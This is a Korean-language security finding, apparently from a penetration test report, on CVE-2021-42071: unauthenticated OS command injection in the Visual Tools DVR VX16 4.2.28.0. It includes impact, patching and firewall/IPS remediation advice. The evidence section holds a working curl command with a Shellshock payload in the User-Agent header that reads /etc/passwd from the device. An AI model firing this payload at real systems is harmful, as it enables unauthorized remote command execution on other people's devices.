## Visual Tools DVR VX16 4.2.28.0 - Unauthenticated OS Command Injection
- **End-Point**: `http://10.64.154.209/cgi-bin/test.cgi/cgi-bin/slogin/login.py`
- **영향**: 인증되지 않은 원격 코드 실행(RCE)이 가능하며, 시스템의 기밀성, 무결성, 가용성을 완전히 손상시킬 수 있음.
- **설명**: Visual Tools DVR VX16 4.2.28.0 버전에서 발생하는 취약점으로, 인증되지 않은 원격 공격자가 특정 요청을 통해 OS 명령을 주입하고 실행할 수 있음(CVE-2021-42071).
- **근거**: `User-Agent` 헤더에 Shellshock 형태의 페이로드를 삽입하여 `/etc/passwd` 파일을 조회하는 다음의 `curl` 명령을 통해 재현됨.
```bash
curl -X 'GET' -d '' -H 'Accept: */*' -H 'Host: 10.64.154.209' -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' 'http://10.64.154.209/cgi-bin/test.cgi/cgi-bin/slogin/login.py'
```
- **대응**: 제조사에서 제공하는 최신 보안 패치 또는 펌웨어 업데이트를 적용하여 취약점을 제거함.
- **조치**: 네트워크 방화벽 및 IPS를 통해 비정상적인 HTTP 헤더를 포함한 요청을 차단하고, 관리 페이지가 공인망에 직접 노출되지 않도록 접근 제어를 설정함.
